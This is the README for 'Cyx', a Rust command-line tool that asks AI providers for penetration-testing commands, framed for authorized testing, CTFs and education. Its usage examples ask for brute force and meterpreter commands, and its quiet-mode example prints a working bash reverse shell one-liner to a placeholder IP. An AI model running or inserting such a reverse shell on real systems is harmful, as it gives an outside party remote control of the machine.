# Cyx

Fast, simple command-line security tool powered by AI. Install with cargo, set up in 30 seconds or less. This tool is solely to give you commands you often forget; it will not provide follow-up solutions to your problems or results.

## Features

- Simple Setup: `cargo install cyx` + 30-second wizard
- Command-First: Code blocks with explanations
- Learn Mode: Detailed breakdowns for education
- Smart Cache: Vector similarity search reduces API calls
- Cloud & Local: Groq (recommended), Perplexity, or Ollama
- Source Attribution: Links to documentation

## Installation

```bash
cargo install cyx
cyx setup
```

That's it! The setup wizard will:
1. Ask which provider you want (Groq or Perplexity)
2. Prompt for your API key
3. Test connection
4. You're ready to go!

### Getting API Keys

- Groq (Recommended): Fast, generous free tier - [Get API key](https://console.groq.com/)
- Perplexity: Web search enabled - [Get API key](https://www.perplexity.ai/settings/api)

### Requirements

- Rust toolchain (for installation)
- API key from Groq or Perplexity

## Quick Start

```bash
# Install
cargo install cyx

# Setup (30 seconds)
cyx setup

# Your first query
cyx "how to list files with hidden files in linux"

# That's it!
```

## Documentation

- [Installation Guide](docs/INSTALLATION.md) - Detailed installation, troubleshooting, and setup
- [Usage Guide](docs/USAGE.md) - Examples, options, and advanced features
- [Building from Source](docs/BUILDING.md) - Build instructions and distribution
- [Development Guide](docs/DEVELOPMENT.md) - Contributing, testing, and releases
- [Changelog](docs/CHANGELOG.md) - Version history and release notes
- [Data Normalization](docs/DATA_NORMALIZATION.md) - Technical deep-dive into normalization data

## Usage

### Basic Commands

```bash
# Quick command lookup
cyx "reverse shell one liner"
cyx "hydra ssh brute force"

# Learn mode with detailed explanations
cyx --learn "metasploit meterpreter"
cyx -l "nmap service detection"
```

### CLI Options

```
-l, --learn          Educational mode with detailed breakdowns
-q, --quiet          Minimal output (response only, no formatting)
-v, --verbose        Detailed progress information
    --no-tty         Disable TTY features for scripting/testing
```

### Configuration

```bash
cyx config show                           # View current config
cyx config set provider perplexity        # Change provider
cyx setup                                 # Re-run setup wizard
```

Config file: `~/.config/cyx/config.toml`

## Output Examples

### Normal Mode

```
[ RESPONSE ]
  ```bash
  nmap -sS <target>
  ```
  TCP SYN stealth scan - doesn't complete handshake. Requires root.
--------------
[ SOURCES ]
 Provider: Perplexity (sonar-pro)
 Search: Yes (performed web search)

Links:
  - nmap documentation: https://nmap.org/book/synscan.html
  - TCP protocol (RFC 793): https://www.ietf.org/rfc/rfc793.txt
```

### Learn Mode

```bash
cyx --learn "nmap stealth scan"
```

Provides detailed explanations with flag breakdowns, protocol details, and alternatives.

### Quiet Mode

```bash
$ cyx -q "reverse shell bash"
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

## Technical Details

### Security

- API keys stored with 600 permissions in `~/.config/cyx/config.toml`
- Read-only operation - provides commands but never executes them
- Timeout protection - all API calls timeout after 120 seconds
- Local-first - all sensitive data remains on your machine

### System Prompts

Normal mode prioritizes executable commands with brief explanations. Learn mode provides detailed educational content with examples and alternatives.

## Troubleshooting

If you encounter issues, run:

```bash
cyx doctor
```

For detailed troubleshooting, see [Installation Guide](docs/INSTALLATION.md).

## Disclaimer

**For authorized security testing, educational purposes, and defensive research only.**

This tool is designed for:
- Professional penetration testers with written authorization
- Security students in controlled lab environments
- Capture The Flag (CTF) competitions
- Defensive security and threat analysis

Always obtain explicit permission before testing systems you don't own.

## License

MIT License - See [LICENSE](LICENSE) for details.
